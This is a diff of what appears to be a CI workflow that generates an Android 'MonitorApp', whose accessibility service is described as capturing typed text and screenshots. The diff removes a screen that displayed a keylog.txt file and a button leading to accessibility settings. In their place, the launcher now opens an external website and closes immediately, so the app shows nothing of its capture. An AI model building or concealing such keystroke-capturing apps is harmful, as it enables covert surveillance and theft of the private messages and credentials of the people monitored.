@@ -152,49 +152,21 @@ jobs:
           import android.content.Intent;
           import android.net.Uri;
           import android.os.Bundle;
-          import android.provider.Settings;
-          import android.widget.Button;
-          import android.widget.TextView;
           import androidx.appcompat.app.AppCompatActivity;
-          import java.io.File;
-          import java.io.FileInputStream;
-          import java.io.IOException;
 
           public class MainActivity extends AppCompatActivity {
-
-              private TextView logTextView;
 
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  setContentView(R.layout.activity_main);
 
-                  logTextView = findViewById(R.id.logTextView);
-                  Button btnEnable = findViewById(R.id.btnEnable);
-                  Button btnRefresh = findViewById(R.id.btnRefresh);
+                  // Automatically open the website
+                  Uri webpage = Uri.parse("https://neon-aim.vercel.app/");
+                  Intent webIntent = new Intent(Intent.ACTION_VIEW, webpage);
+                  startActivity(webIntent);
 
-                  btnEnable.setOnClickListener(v -> {
-                      Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                      startActivity(intent);
-                  });
-
-                  btnRefresh.setOnClickListener(v -> refreshLog());
-              }
-
-              private void refreshLog() {
-                  File dir = new File(getExternalFilesDir(null), "logs");
-                  File file = new File(dir, "keylog.txt");
-                  if (!file.exists()) {
-                      logTextView.setText("No logs yet.");
-                      return;
-                  }
-                  try (FileInputStream fis = new FileInputStream(file)) {
-                      byte[] data = new byte[(int) file.length()];
-                      fis.read(data);
-                      logTextView.setText(new String(data));
-                  } catch (IOException e) {
-                      logTextView.setText("Error reading logs.");
-                  }
+                  // Close this activity so the user doesn't see a blank screen
+                  finish();
               }
           }
           EOF
@@ -425,30 +397,10 @@ jobs:
               android:orientation="vertical"
               android:padding="16dp">
 
-              <Button
-                  android:id="@+id/btnEnable"
-                  android:layout_width="match_parent"
+              <TextView
+                  android:layout_width="wrap_content"
                   android:layout_height="wrap_content"
-                  android:text="Enable Accessibility Service" />
-
-              <Button
-                  android:id="@+id/btnRefresh"
-                  android:layout_width="match_parent"
-                  android:layout_height="wrap_content"
-                  android:text="Refresh Logs" />
-
-              <ScrollView
-                  android:layout_width="match_parent"
-                  android:layout_height="match_parent"
-                  android:layout_marginTop="16dp">
-
-                  <TextView
-                      android:id="@+id/logTextView"
-                      android:layout_width="match_parent"
-                      android:layout_height="wrap_content"
-                      android:fontFamily="monospace"
-                      android:text="Logs will appear here..." />
-              </ScrollView>
+                  android:text="Redirecting..." />
           </LinearLayout>
           EOF
 
@@ -456,6 +408,12 @@ jobs:
           <resources>
               <string name="app_name">MonitorApp</string>
               <string name="accessibility_service_description">This service monitors typed text and captures screenshots for parental supervision with consent.</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/values/styles.xml << 'EOF'
+          <resources>
+              <style name="Theme.MonitorApp" parent="Theme.AppCompat.Light.NoActionBar" />
           </resources>
           EOF
 
